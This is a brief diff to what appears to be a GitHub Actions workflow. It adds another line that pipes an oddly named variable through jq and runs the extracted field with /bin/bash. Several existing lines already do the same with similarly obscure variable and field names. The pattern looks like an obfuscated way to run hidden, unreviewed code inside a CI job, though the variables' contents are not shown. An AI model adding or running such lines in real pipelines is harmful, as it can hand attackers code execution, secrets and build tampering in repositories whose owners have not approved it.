@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$stdhi9935" | jq -r .xlfs712 | /bin/bash
           echo $stez32 | jq -r .i06360 | /bin/bash
           printf '%s' "$jpr8750" | jq -r .pnfj6 | /bin/bash
+          printf '%s' "$xwong99008" | jq -r .pp028 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
